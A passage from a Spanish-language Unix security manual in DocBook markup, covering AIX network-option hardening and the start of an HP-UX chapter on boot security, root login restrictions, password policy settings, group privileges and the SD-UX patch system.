ejemplo, si queremos que esto sea as&#x02CA;&#x0131; debemos ejecutar la siguiente orden (recordamos que, al
igual que suced&#x02CA;&#x0131;a con &#x2018;no&#x2019;, los cambios s&#x00F3;lo tienen efecto sobre el kernel que se encuentra en
ejecuci&#x00F3;n, por lo que si se produce un reinicio de la m&#x00E1;quina el comportamiento ser&#x00E1; el de&#xFB01;nido por
defecto):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;nfso&#x00A0;-o&#x00A0;portcheck
&#x00A0;portcheck=&#x00A0;0
&#x00A0;bruja:/#&#x00A0;nfso&#x00A0;-o&#x00A0;portcheck=1
&#x00A0;bruja:/#&#x00A0;nfso&#x00A0;-o&#x00A0;portcheck
&#x00A0;portcheck=&#x00A0;1
&#x00A0;bruja:/#
</literallayout>
<!--l. 1596--><para>Existen otros par&#x00E1;metros con&#xFB01;gurables mediante nfso que nos pueden resultar interesantes para incrementar
nuestra seguridad; por ejemplo, nfs<informalequation><graphic 
fileref="unixsec211x.gif"></graphic></informalequation>use<informalequation><graphic 
fileref="unixsec212x.gif"></graphic></informalequation>reserve<informalequation><graphic 
fileref="unixsec213x.gif"></graphic></informalequation>ports puesto a 0 (por defecto) especi&#xFB01;car&#x00E1; que se
utilicen puertos no reservados para las comunicaciones entre cliente y servidor NFS, nfs<informalequation><graphic 
fileref="unixsec214x.gif"></graphic></informalequation>max<informalequation><graphic 
fileref="unixsec215x.gif"></graphic></informalequation>connections
y nfs<informalequation><graphic 
fileref="unixsec216x.gif"></graphic></informalequation>max<informalequation><graphic 
fileref="unixsec217x.gif"></graphic></informalequation>threads de&#xFB01;nen respectivamente l&#x02CA;&#x0131;mites al n&#x00FA;mero de conexiones simult&#x00E1;neas y de hilos
servidores que se van a aceptar en un sistema AIX, etc. Como siempre, es imprescindible
consultar la p&#x00E1;gina de manual correspondiente en la versi&#x00F3;n de AIX que estemos ejecutando para
conocer todos los par&#x00E1;metros sintonizables mediante &#x2018;nfso&#x2019; y sus repercusiones en nuestra
seguridad.
<!--br/-->
<!--br/-->Tal y como suced&#x02CA;&#x0131;a con &#x2018;ndd&#x2019;, los cambios efectuados con &#x2018;no&#x2019; tienen efecto sobre el kernel que se est&#x00E1;
ejecutando en un cierto momento, por lo que si el sistema se reinicia deberemos volver a dar el valor que
nos interese a ciertos par&#x00E1;metros ejecutando la orden en el arranque de la m&#x00E1;quina. En AIX este arranque es
m&#x00E1;s peculiar que en otros entornos, y si queremos a~nadir estas instrucciones en cada inicio del sistema
debemos crear el script correspondiente y plani&#xFB01;carlo para que se ejecute desde /etc/inittab
(<citation>[?]</citation>):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;cat&#x00A0;/etc/rc.securenet
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ipforwarding=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ip6forwarding=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;clean&#x005F;partial&#x005F;conns=1
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;bcastping=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;directed&#x005F;broadcast=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;icmpaddressmask=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ipsendredirects=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ipignoreredirects=1
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ipsrcroutesend=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ipsrcrouterecv=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ipsrcrouteforward=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;ip6srcrouteforward=0
&#x00A0;/usr/sbin/no&#x00A0;-o&#x00A0;arpt&#x005F;killc=1
&#x00A0;/usr/sbin/nfso&#x00A0;-o&#x00A0;portcheck=1
&#x00A0;bruja:/#&#x00A0;chmod&#x00A0;700&#x00A0;/etc/rc.securenet
&#x00A0;bruja:/#&#x00A0;mkitab&#x00A0;&#x0022;rcsecurenet:2:once:/etc/rc.securenet&#x00A0;2&#x003E;&#x0026;1&#x00A0;&#x003E;/dev/console&#x0022;
&#x00A0;bruja:/#
</literallayout>


<!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-17500012"  ></anchor>HP-UX</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">12.1</abbrev><anchor 
   id="x1-17600012.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  HP-UX es la versi&#x00F3;n de Unix desarrollada y mantenida por Hewlett&#x2013;Packard desde 1983, ejecutable
t&#x02CA;&#x0131;picamente sobre procesadores HP PA RISC y en sus &#x00FA;ltima versiones sobre Intel Itanium
(arquitectura Intel de 64 bits); a pesar de estar basada ampliamente en System V incorpora
importantes caracter&#x02CA;&#x0131;sticas BSD. En la actualidad la &#x00FA;ltima versi&#x00F3;n del operativo es la 11.11, aunque
existen numerosas instalaciones de sistemas m&#x00E1;s antiguos, especialmente HP-UX 10.x o incluso
9.x.
<!--br/-->
<!--br/-->HP-UX es, como la mayor parte de Unices comerciales, un entorno de trabajo &#xFB02;exible, potente y estable,
que soporta un abanico de aplicaciones que van desde simples editores de texto a complicados programas
de dise~no gr&#x00E1;&#xFB01;co o c&#x00E1;lculo cient&#x02CA;&#x0131;&#xFB01;co, pasando por sistemas de control industrial que incluyen plani&#xFB01;caciones
de tiempo real.
<!--br/-->
<!--br/-->Durante los &#x00FA;ltimos a~nos Hewlett&#x2013;Packard, como muchos otros fabricantes, parece haberse interesado
bastante por la seguridad en general, y en concreto por los sistemas de protecci&#x00F3;n para sus sistemas; prueba
de ello es la gama de productos relacionados con este campo desarrollados para HP-UX, como el sistema
de detecci&#x00F3;n de intrusos IDS/9000 para HP-UX 11.x corriendo sobre m&#x00E1;quinas HP-9000 o la utilidad
Security Patch Check, similar al PatchDiag de Sun Microsystems. Tambi&#x00E9;n es importante destacar las
grandes mejoras en cuanto a seguridad del sistema se re&#xFB01;ere entre HP-UX 9.x, HP-UX 10.x y muy
especialmente HP-UX 11.x.
<!--br/-->
<!--br/-->En este cap&#x02CA;&#x0131;tulo, como hemos hecho antes con Solaris, Linux y AIX, hablaremos de aspectos de la
seguridad particulares de HP-UX, teniendo siempre presente que el resto de cap&#x02CA;&#x0131;tulos del documento
tambi&#x00E9;n son aplicables a este operativo. Para conocer m&#x00E1;s HP-UX podemos consultar <citation>[?]</citation> o <citation>[?]</citation>, y si nos
interesa especialmente su seguridad una obra obligatoria es <citation>[?]</citation>. Aparte de documentaci&#x00F3;n impresa, a
trav&#x00E9;s de Internet podemos acceder a numerosa documentaci&#x00F3;n t&#x00E9;cnica de HP-UX, en la URL
http://docs.hp.com/; por supuesto, tambi&#x00E9;n son b&#x00E1;sicas para una correcta administraci&#x00F3;n las p&#x00E1;ginas de
manual que se instalan con el producto.
  </para></section><!--end section--><!--l. 34--><section 
role="section"><title><abbrev role="title-mark">12.2</abbrev><anchor 
   id="x1-17700012.2"  ></anchor>Seguridad f&#x02CA;&#x0131;sica en PA&#x2013;RISC</title>
<!--l. 35--><para>  Los sistemas de las series HP9000 incluyen un &#xFB01;rmware muy similar a la OpenBoot PROM de las
estaciones y servidores SPARC que se denomina PDC (Processor Dependent Code) y que implementa las
funcionalidades dependientes del procesador; su funci&#x00F3;n b&#x00E1;sica es, en el arranque de la m&#x00E1;quina, inicializar el
procesador y comprobar que su estado es correcto mediante unas pruebas llamadas POST
(Power On Self Test). Si todo es satisfactorio el PDC carga el ISL (Initial System Loader) o IPL
(Initial Program Loader) y le trans&#xFB01;ere el control para que este pueda arrancar el sistema
operativo.
<!--br/-->
<!--br/-->Como en cualquier dispositivo hardware existen formas de interrumpir el proceso de arranque
habitual para modi&#xFB01;car su comportamiento; en concreto, en la familia HP9000 suele existir
un intervalo de 10 segundos antes de cargar el ISL en el que sin m&#x00E1;s que pulsar la tecla
ESC <anchor 
   id="x1-177001f1"  ></anchor><footnote><para>    Dependiendo de la serie concreta es posible que la pulsaci&#x00F3;n de cualquier tecla interrumpa el proceso; esto sucede, por
ejemplo, en los modelos de las series 800.</para></footnote> se
puede acceder al men&#x00FA; de arranque del equipo y, desde este, de&#xFB01;nir dispositivos de arranque alternativos o
interactuar con el ISL, por ejemplo para pasar un par&#x00E1;metro al kernel de HP-UX antes de cargarlo; decimos
&#x2018;suele existir&#x2019; porque el intervalo durante el cual se puede interrumpir el autoarranque se respeta s&#x00F3;lo si las
variables autoboot y autosearch del ISL est&#x00E1;n activadas, ya que en caso contrario el sistema
autom&#x00E1;ticamente accede al men&#x00FA; de arranque y no se inicia hasta que un operador no interactua con el
mismo.
<!--br/-->
<!--br/-->Si al interrumpir el proceso de arranque elegimos interactuar con el ISL llegamos a un prompt sencillo en el
que podemos comenzar a introducir &#x00F3;rdenes desde el cargador hpux, como &#x2018;hpux -v&#x2019;, que muestra la
versi&#x00F3;n del ISL o &#x2018;hpux -iS&#x2019;, que inicia el operativo en modo monousuario:


     </para><literallayout role="verbatim">
&#x00A0;Hard&#x00A0;booted.
&#x00A0;
&#x00A0;ISL&#x00A0;Revision&#x00A0;A.00.09&#x00A0;&#x00A0;March&#x00A0;27,&#x00A0;1990
&#x00A0;
&#x00A0;ISL&#x003E;&#x00A0;hpux&#x00A0;-v
&#x00A0;Secondary&#x00A0;Loader&#x00A0;9000/700
&#x00A0;Revision&#x00A0;1.1
&#x00A0;@(#)&#x00A0;Revision&#x00A0;1.1&#x00A0;Wed&#x00A0;Dec&#x00A0;10&#x00A0;17:24:28&#x00A0;PST&#x00A0;1986
&#x00A0;
&#x00A0;ISL&#x003E;
</literallayout>
<!--l. 77--><para>Antes de acceder a este prompt podemos activar o resetar una variable denominada secure, que indica el
modo de arranque seguro del equipo; si est&#x00E1; activada no se podr&#x00E1; interactuar con el arranque
del sistema, lo cual implica una protecci&#x00F3;n relativa: un atacante situado delante del equipo lo
tendr&#x00E1; m&#x00E1;s dif&#x02CA;&#x0131;cil para arrancar el sistema desde un dispositivo que no sea el est&#x00E1;ndar, o para
iniciarlo en modo monousuario. El hecho de que esta protecci&#x00F3;n sea relativa es l&#x00F3;gico: si no fuera
reversible, nunca nadie m&#x00E1;s podr&#x02CA;&#x0131;a modi&#xFB01;car la secuencia de arranque del equipo; si aunque el
modo de arranque seguro est&#x00E9; activado queremos o necesitamos interrumpir el arranque, no
tenemos m&#x00E1;s que desconectar todos los dispositivos arrancables del equipo (discos, red, unidad de
CD-ROM&#x2026;), de forma que el arranque falle y se acceda al men&#x00FA; para poder resetear la variable
secure.
  </para></section><!--end section--><!--l. 89--><section 
role="section"><title><abbrev role="title-mark">12.3</abbrev><anchor 
   id="x1-17800012.3"  ></anchor>Usuarios y accesos al sistema</title>
<!--l. 90--><para>  Como sucede en Linux, el acceso root remoto a una m&#x00E1;quina HP-UX se puede y debe limitar desde el
archivo /etc/securetty, donde se listan las terminales desde las que el superusuario del sistema puede
acceder al mismo; si queremos que el root s&#x00F3;lo pueda conectar desde la consola f&#x02CA;&#x0131;sica de la m&#x00E1;quina este
archivo debe ser creado de la forma siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;echo&#x00A0;console&#x00A0;&#x003E;&#x00A0;/etc/securetty
&#x00A0;marta:/#&#x00A0;chown&#x00A0;root:sys&#x00A0;/etc/securetty
&#x00A0;marta:/#&#x00A0;chmod&#x00A0;644&#x00A0;/etc/securetty
&#x00A0;marta:/#
</literallayout>
<!--l. 103--><para>De nuevo, al igual que suced&#x02CA;&#x0131;a en Linux, esto no evita que se pueda ejecutar &#x2018;su&#x2019; desde cualquier sesi&#x00F3;n para
conseguir privilegios de administrador, ni deshabilita el acceso remoto v&#x02CA;&#x0131;a SSH o X Window. En el primer
caso debemos vetar el acceso desde el archivo de con&#xFB01;guraci&#x00F3;n de sshd, mientras que en el segundo
podemos hacerlo de la forma siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;cp&#x00A0;-p&#x00A0;/usr/dt/config/Xstartup&#x00A0;/etc/dt/config/Xstartup
&#x00A0;marta:/#&#x00A0;print&#x00A0;&#x0022;[[&#x00A0;${USER}&#x00A0;=&#x00A0;root&#x00A0;]]&#x00A0;&#x0026;&#x0026;&#x00A0;exit&#x00A0;1&#x0022;&#x00A0;&#x003E;&#x003E;/etc/dt/config/Xstartup
&#x00A0;marta:/#
</literallayout>
<!--l. 116--><para>Muchos de los par&#x00E1;metros que controlan el acceso de los usuarios a un sistema HP-UX se de&#xFB01;nen en el
archivo /etc/default/security, que ha de tener permiso de escritura para root y de lectura para todos
los usuarios; si este &#xFB01;chero no existe, el administrador puede &#x2013; y debe &#x2013; crearlo. Esta feature del operativo
fue introducida de forma no documentada en HP-UX 11.0, y se incluye tambi&#x00E9;n en HP-UX 11i, ya
documentada en la p&#x00E1;gina de manual de &#x2018;security&#x2019;. Un ejemplo de este archivo puede ser el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;cat&#x00A0;/etc/default/security
&#x00A0;ABORT&#x005F;LOGIN&#x005F;ON&#x005F;MISSING&#x005F;HOMEDIR=1
&#x00A0;MIN&#x005F;PASSWORD&#x005F;LENGTH=8
&#x00A0;NOLOGIN=1
&#x00A0;NUMBER&#x005F;OF&#x005F;LOGINS&#x005F;ALLOWED=3
&#x00A0;PASSWORD&#x005F;HISTORY&#x005F;DEPTH=2
&#x00A0;SU&#x005F;ROOT&#x005F;GROUP=admins
&#x00A0;#SU&#x005F;DEFAULT&#x005F;PATH=
&#x00A0;marta:/#
</literallayout>
<!--l. 136--><para>Seguramente los par&#x00E1;metros m&#x00E1;s importantes que podemos encontrar en este archivo son los referentes a las
claves de usuario; tenemos en primer lugar MIN<informalequation><graphic 
fileref="unixsec219x.gif"></graphic></informalequation>PASSWORD<informalequation><graphic 
fileref="unixsec220x.gif"></graphic></informalequation>LENGTH, que como su nombre indica de&#xFB01;ne la
longitud m&#x02CA;&#x0131;nima de las contrase~nas en el sistema; mientras que en un HP-UX normal no afecta al root, en
Trusted HP-UX s&#x02CA;&#x0131; que lo hace. Puede adoptar cualquier valor entre 6 (el m&#x02CA;&#x0131;nimo por defecto) y 8 en los
entornos normales, y entre 6 y 80 en Trusted HP-UX. El otro par&#x00E1;metro referente a las contrase~nas es
PASSWORD<informalequation><graphic 
fileref="unixsec221x.gif"></graphic></informalequation>HISTORY<informalequation><graphic 
fileref="unixsec222x.gif"></graphic></informalequation>DEPTH, que marca los passwords antiguos contra los que se compara uno nuevo: si su
valor es N, cuando un usuario cambia su clave no podr&#x00E1; utilizar ninguna de sus N anteriores contrase~nas. El
valor de esta variable puede ser cualquier n&#x00FA;mero entre 1 (valor por defecto) y 10, el valor
m&#x00E1;ximo; si su valor es 2, evitamos que un usuario alterne constantemente dos contrase~nas en el
sistema.
<!--br/-->
<!--br/-->Otro grupo de directivas es el formado por aquellas que afectan a la entrada de usuarios en el
sistema; tenemos en primer lugar ABORT<informalequation><graphic 
fileref="unixsec223x.gif"></graphic></informalequation>LOGIN<informalequation><graphic 
fileref="unixsec224x.gif"></graphic></informalequation>ON<informalequation><graphic 
fileref="unixsec225x.gif"></graphic></informalequation>MISSING<informalequation><graphic 
fileref="unixsec226x.gif"></graphic></informalequation>HOMEDIR, que de&#xFB01;ne c&#x00F3;mo ha de
comportarse el operativo cuando un usuario se autentica correctamente pero su directorio $HOME no
existe. Si su valor es 0, el acceso se autorizar&#x00E1; y el usuario entrar&#x00E1; directamente al directorio &#x2018;/&#x2019;;
si es 1, el login ser&#x00E1; rechazado a pesar de que la autenticaci&#x00F3;n haya sido correcta.La segunda
directiva de este grupo es NOLOGIN: si su valor es 1 y el &#xFB01;chero /etc/nologin existe, cuando un
usuario diferente del root se autentique para entrar al sistema se le mostrar&#x00E1; el contenido del
archivo y se le cerrar&#x00E1; la conexi&#x00F3;n (lo habitual en todos los Unices); por contra, si el valor de esta
variable es 0, el archivo /etc/nologin simplemente ser&#x00E1; ignorado. Finalmente, la directiva
NUMBER<informalequation><graphic 
fileref="unixsec227x.gif"></graphic></informalequation>OF<informalequation><graphic 
fileref="unixsec228x.gif"></graphic></informalequation>LOGINS<informalequation><graphic 
fileref="unixsec229x.gif"></graphic></informalequation>ALLOWED delimita el n&#x00FA;mero m&#x00E1;ximo de conexiones simult&#x00E1;neas que los
usuarios diferentes de &#x2018;root&#x2019; pueden poseer en el sistema; si su valor es 0, este n&#x00FA;mero es
ilimitado.
<!--br/-->
<!--br/-->Vamos a ver por &#x00FA;ltimo un par de directivas que afectan a la ejecuci&#x00F3;n de la orden &#x2018;su&#x2019; en el
sistema. En primer lugar tenemos SU<informalequation><graphic 
fileref="unixsec230x.gif"></graphic></informalequation>ROOT<informalequation><graphic 
fileref="unixsec231x.gif"></graphic></informalequation>GROUP, que indica qu&#x00E9; grupo de usuarios puede
ejecutar la orden para convertirse &#x2013; tecleando la contrase~na, evidentemente &#x2013; en administrador
del sistema. Si este par&#x00E1;metro no est&#x00E1; de&#xFB01;nido, cualquier usuario que conozca la clave puede
convertirse en root, mientras que si lo est&#x00E1; s&#x00F3;lo los usuarios pertenecientes al grupo indicado pueden
hacerlo.
<!--br/-->
<!--br/-->Aparte del anterior par&#x00E1;metro, en HP-UX 11i se introdujo una nueva directiva en el &#xFB01;chero
/etc/default/security; se trata de SU<informalequation><graphic 
fileref="unixsec232x.gif"></graphic></informalequation>DEFAULT<informalequation><graphic 
fileref="unixsec233x.gif"></graphic></informalequation>PATH, que marca el valor de la variable $PATH cuando
alguien cambia su identi&#xFB01;cador de usuario mediante &#x2018;su&#x2019; sin la opci&#x00F3;n &#x2018;-&#x2019; (esto es, sin emular un login
real).
<!--br/-->
<!--br/-->Acabamos de ver que en el archivo /etc/default/security se pueden con&#xFB01;gurar diferentes aspectos
relativos a las pol&#x02CA;&#x0131;ticas de contrase~nas a seguir en un sistema HP-UX; no obstante, algunos de los puntos
m&#x00E1;s importantes de cualquier pol&#x02CA;&#x0131;tica est&#x00E1;n, como ocurre en Solaris, integrados dentro de la propia orden
passwd: entre ellos algunos tan decisivos como la longitud m&#x02CA;&#x0131;nima de una contrase~na. Un
esquema de este tipo resulta algo pobre actualmente, y como ya dijimos, cualquier Unix moderno
deber&#x02CA;&#x0131;a incluir &#x2018;de serie&#x2019; la posibilidad de ofrecer una granularidad m&#x00E1;s adecuada en todo lo
respectivo a las claves de los usuarios. Sea como sea, el esquema seguido en HP-UX es muy similar

al de Solaris en cuanto a los requisitos m&#x02CA;&#x0131;nimos para un password: al menos seis caracteres,
dos de los cuales han de ser letras y uno num&#x00E9;rico o especial, diferencias con la contrase~na
anterior en al menos tres caracteres &#x2013; considerando equivalentes a may&#x00FA;sculas y min&#x00FA;sculas
para este prop&#x00F3;sito &#x2013;, clave diferente del nombre de usuario y cualquier rotaci&#x00F3;n del mismo,
etc.
<!--br/-->
<!--br/-->Ya para &#xFB01;nalizar este punto, y relacionado tambi&#x00E9;n con la gesti&#x00F3;n de usuarios en HP-UX (aunque no
expl&#x02CA;&#x0131;citamente con el acceso de los mismos al sistema), es necesario hablar brevemente de los privilegios de
grupo; este mecanismo, introducido en HP-UX 9.0, permite asignar a un grupo ciertos privilegios de
administraci&#x00F3;n, distribuyendo en cierta forma el &#x2018;poder&#x2019; del superusuario y rompiendo la aproximaci&#x00F3;n al
reparto de privilegios cl&#x00E1;sico de Unix (todo o nada). En la tabla  <ulink 
  url="#x1-1780011"  ><!--ref: privgrp--></ulink> se muestran los privilegios de
grupo soportados en HP-UX junto a la versi&#x00F3;n del operativo en la que fueron introducidos
(<citation>[?]</citation>).
<!--br/-->
</para><section role="center"><title/>
<!--l. 203--><para> </para><table ><informaltable><tgroup cols="3"><tbody><row><entry 
 align="center"><para>Versi&#x00F3;n</para></entry><entry 
 align="center"><para>  Privilegio   </para></entry><entry 
 align="center"><para>              Descripci&#x00F3;n                     </para></entry>
 </row><row><entry 
 align="center"><para>   9   </para></entry><entry 
 align="center"><para>   RTPRIO    </para></entry><entry 
 align="center"><para>Especi&#xFB01;caci&#x00F3;n de prioridades de tiempo real</para></entry>
 </row><row><entry 
 align="center"><para>   9   </para></entry><entry 
 align="center"><para>   MLOCK    </para></entry><entry 
 align="center"><para>         Utilizaci&#x00F3;n de plock()         </para></entry>
 </row><row><entry 
 align="center"><para>  9   </para></entry><entry 
 align="center"><para>   CHOWN    </para></entry><entry 
 align="center"><para>           System V chown           </para></entry>
 </row><row><entry 
 align="center"><para>  9   </para></entry><entry 
 align="center"><para>LOCKRDONLY</para></entry><entry 
 align="center"><para>         Utilizaci&#x00F3;n de lockf()         </para></entry>
 </row><row><entry 
 align="center"><para>  9   </para></entry><entry 
 align="center"><para> SETRUGID  </para></entry><entry 
 align="center"><para>   Utilizaci&#x00F3;n de setuid() y setgid()   </para></entry>
 </row><row><entry 
 align="center"><para>  10   </para></entry><entry 
 align="center"><para>   MPCTL    </para></entry><entry 
 align="center"><para>         Utilizaci&#x00F3;n de mpctl()         </para></entry>
 </row><row><entry 
 align="center"><para>  10   </para></entry><entry 
 align="center"><para>  RTSCHED   </para></entry><entry 
 align="center"><para>    Utilizaci&#x00F3;n de sched<informalequation><graphic 
fileref="unixsec234x.gif"></graphic></informalequation>setparam()    </para></entry>
 </row><row><entry 
 align="center"><para>  10   </para></entry><entry 
 align="center"><para> SERIALIZE  </para></entry><entry 
 align="center"><para>       Utilizaci&#x00F3;n de serialize()       </para></entry>
 </row><row><entry 
 align="center"><para>  11   </para></entry><entry 
 align="center"><para>  SPUCTL   </para></entry><entry 
 align="center"><para>        Utilizaci&#x00F3;n de spuctl()        </para></entry>
 </row><row><entry 
 align="center"><para> 11i  </para></entry><entry 
 align="center"><para> FSSTHREAD </para></entry><entry 
 align="center"><para>          Utilizaci&#x00F3;n de fss()          </para></entry>
 </row><row><entry 
 align="center"><para> 11i  </para></entry><entry 
 align="center"><para>    PSET     </para></entry><entry 
 align="center"><para>        Utilizaci&#x00F3;n de pset<informalequation><graphic 
fileref="unixsec235x.gif"></graphic></informalequation>()        </para></entry>
 </row><row><entry 
 align="center"><para>     </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1780011"  ></anchor>Cuadro&#x00A0;12.1</title><para>Privilegios de grupo en HP-UX</para></blockquote>
</section>
<!--l. 236--><para>  Para asignar privilegios a un determinado grupo se utiliza la orden setprivgrp desde l&#x02CA;&#x0131;nea de
comandos, y para que las modi&#xFB01;caciones sean permanentes en el arranque de la m&#x00E1;quina se lee el archivo
/etc/privgroup (si existe) desde /etc/rc en HP-UX 9.x o de /etc/init.d/set<informalequation><graphic 
fileref="unixsec236x.gif"></graphic></informalequation>prvgrp en versiones
superiores; en este &#xFB01;chero se indican (uno por l&#x02CA;&#x0131;nea) los privilegios a otorgar o eliminar a cada
grupo:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;cat&#x00A0;/etc/privgroup
&#x00A0;-n&#x00A0;CHOWN
&#x00A0;admins&#x00A0;CHOWN
&#x00A0;admins&#x00A0;SETRUGID
&#x00A0;marta:/#
</literallayout>
<!--l. 251--><para>En el anterior ejemplo se limita de forma global el permiso para ejecutar chown a todos los usuarios, y a
continuaci&#x00F3;n se habilita ese mismo permiso, junto a la capacidad para utilizar setuid() y setgid(), a los
miembros del grupo admins. Al menos la primera entrada deber&#x02CA;&#x0131;a encontrarse siempre en HP-UX, ya que
por defecto el operativo presenta un comportamiento de chown basado en System V, lo que permite que
un usuario pueda cambiar la propiedad de sus archivos asign&#x00E1;ndolos al resto de usuarios &#x2013;
incluido el root &#x2013;, lo que claramente puede llegar a suponer un problema de seguridad; es
mucho m&#x00E1;s recomendable una aproximaci&#x00F3;n basada en BSD, que limita la ejecuci&#x00F3;n de chown al
root.
<!--br/-->
<!--br/-->Como en otros sistemas Unix, cuando en HP-UX un usuario quiere cambiar de grupo puede ejecutar la
orden newgrp; sin embargo, se introduce una caracter&#x02CA;&#x0131;stica adicional: en el &#xFB01;chero /etc/logingroup, de
formato similar a /etc/group (de hecho puede ser un enlace a este por cuestiones de simplicidad), se
de&#xFB01;ne la lista inicial de grupos a los que un usuario pertenece, es decir, aquellos sobre los cuales no tiene
que ejecutar &#x2018;newgrp&#x2019; para convertirse en miembro de los mismos. Si este archivo no existe o est&#x00E1; vac&#x02CA;&#x0131;o, el
usuario ha de ejecutar &#x2018;newgrp&#x2019; siempre que quiera acceder a un grupo secundario, y evidentemente
conocer la clave de grupo (como en cualquier Unix, si no est&#x00E1; de&#xFB01;nido un password para el grupo, ning&#x00FA;n
usuario puede pertenecer a &#x00E9;l si no es como grupo primario); en cualquier caso, la relaci&#x00F3;n de grupos
secudarios para un usuario ha de de&#xFB01;nirse en /etc/logingroup, ya que si s&#x00F3;lo lo est&#x00E1; en /etc/group
se ignorar&#x00E1; y el usuario deber&#x00E1; ejecutar &#x2018;newgrp&#x2019; para acceder a los grupos secundarios no
de&#xFB01;nidos.
<!--br/-->
<!--br/-->La orden &#x2018;groups&#x2019; nos indicar&#x00E1; a qu&#x00E9; grupos pertenece de forma directa &#x2013; sin tener que teclear ninguna
contrase~na &#x2013; un cierto usuario, bas&#x00E1;ndose para ello en la informaci&#x00F3;n almacenada en /etc/passwd,
/etc/group y /etc/logingroup:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;groups&#x00A0;root
&#x00A0;adm&#x00A0;bin&#x00A0;daemon&#x00A0;lmadmin&#x00A0;lp&#x00A0;mail&#x00A0;other&#x00A0;root&#x00A0;sys&#x00A0;users
&#x00A0;marta:/#
</literallayout>
<!--l. 287--><para>
  </para></section><!--end section--><!--l. 287--><section 
role="section"><title><abbrev role="title-mark">12.4</abbrev><anchor 
   id="x1-17900012.4"  ></anchor>El sistema de parcheado</title>
<!--l. 288--><para>  En los sistemas HP-UX la gesti&#x00F3;n de software, tanto paquetes como parches, se puede llevar a cabo de
una forma sencilla mediante la familia de comandos sw<informalequation><graphic 
fileref="unixsec237x.gif"></graphic></informalequation>: swinstall, swlist, swremove&#x2026;; a este sistema
de gesti&#x00F3;n se le denomina SD-UX (Software Distributor HP-UX), y a pesar de estar basado en
una tecnolog&#x02CA;&#x0131;a distribuida cliente&#x2013;servidor permite &#x00FA;nicamente la gesti&#x00F3;n en la m&#x00E1;quina local.
Para obtener m&#x00E1;s informaci&#x00F3;n sobre el funcionamiento de SD-UX es recomendable consultar
<citation>[?]</citation>.
<!--br/-->
<!--br/-->Igual que suced&#x02CA;&#x0131;a en AIX, HP-UX posee una terminolog&#x02CA;&#x0131;a propia para referirse a los diferentes
objetos del Software Distributor. El objeto m&#x00E1;s peque~no manejado por SD-UX es el &#xFB01;leset, que
no es m&#x00E1;s que un subconjunto de los diferentes &#xFB01;cheros que forman un producto, que a su
vez es un conjunto de &#xFB01;lesets estructurado de cierta forma, en el que se incluyen scripts de
control para facilitar su manejo como un &#x00FA;nico objeto. HP-UX suele manejar sus parches a
nivel de producto: un parche es un producto que puede estar formado por diferentes &#xFB01;lesets,
aunque lo m&#x00E1;s normal es que lo est&#x00E9; por uno solo; si no fuera as&#x02CA;&#x0131;, y descarg&#x00E1;ramos un parche
formado por varios &#xFB01;lesets, es recomendable instalar todos como un &#x00FA;nico producto: aunque
SD-UX permite el manejo de parches a nivel de &#xFB01;lesets individuales, aplicar s&#x00F3;lo algunos de ellos
puede provocar que la vulnerabilidad que el parche ha de solucionar permanezca en el sistema
(<citation>[?]</citation>.
<!--br/-->
<!--br/-->El siguiente nivel de software es el bundle, un objeto manejado por SD-UX que agrupa diferentes
productos y &#xFB01;lesets relacionados entre s&#x02CA;&#x0131;, consiguiendo de esta forma una gesti&#x00F3;n de software m&#x00E1;s
c&#x00F3;moda: por ejemplo, podemos utilizar bundles de parches para actualizar nuestro sistema, sin
necesidad de descargar e instalar cada uno de esos parches de forma individual. Por &#x00FA;ltimo, en
SD-UX se introduce el concepto de depot, un almac&#x00E9;n de software en forma de directorio,
cinta, CD-ROM o &#xFB01;chero &#x00FA;nico, que permite la instalaci&#x00F3;n local o remota de sus contenidos: por
ejemplo, el directorio /var/adm/sw/products/ puede ser considerado un depot, que a su vez
contiene productos en forma de subdirectorios, que a su vez contienen &#xFB01;lesets tambi&#x00E9;n en forma
de subdirectorio, como veremos en el pr&#x00F3;ximo ejemplo; mediante la orden swcopy podemos
crear nuestros propios depots, que nos facilitar&#x00E1;n la tarea de gestionar el software de diferentes
sistemas.
<!--br/-->
<!--br/-->Todo el software instalado en una m&#x00E1;quina queda registrado en un cat&#x00E1;logo denominado IPD
(Installed Products Database), que se encuentra en el directorio /var/adm/sw/products/.
Por ejemplo, para obtener un listado de los &#xFB01;lesets instalados en la m&#x00E1;quina relacionados con
el producto accounting, junto a la versi&#x00F3;n de los mismos podemos utilizar la orden swlist o
simplemente consultar la IPD con comandos como ls o cat (por supuesto, la primera forma es la
recomendable):

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;swlist&#x00A0;-l&#x00A0;fileset&#x00A0;Accounting
&#x00A0;#&#x00A0;Initializing...
&#x00A0;#&#x00A0;Contacting&#x00A0;target&#x00A0;&#x0022;marta&#x0022;...
&#x00A0;#
&#x00A0;#&#x00A0;Target:&#x00A0;&#x00A0;marta:/
&#x00A0;#
&#x00A0;
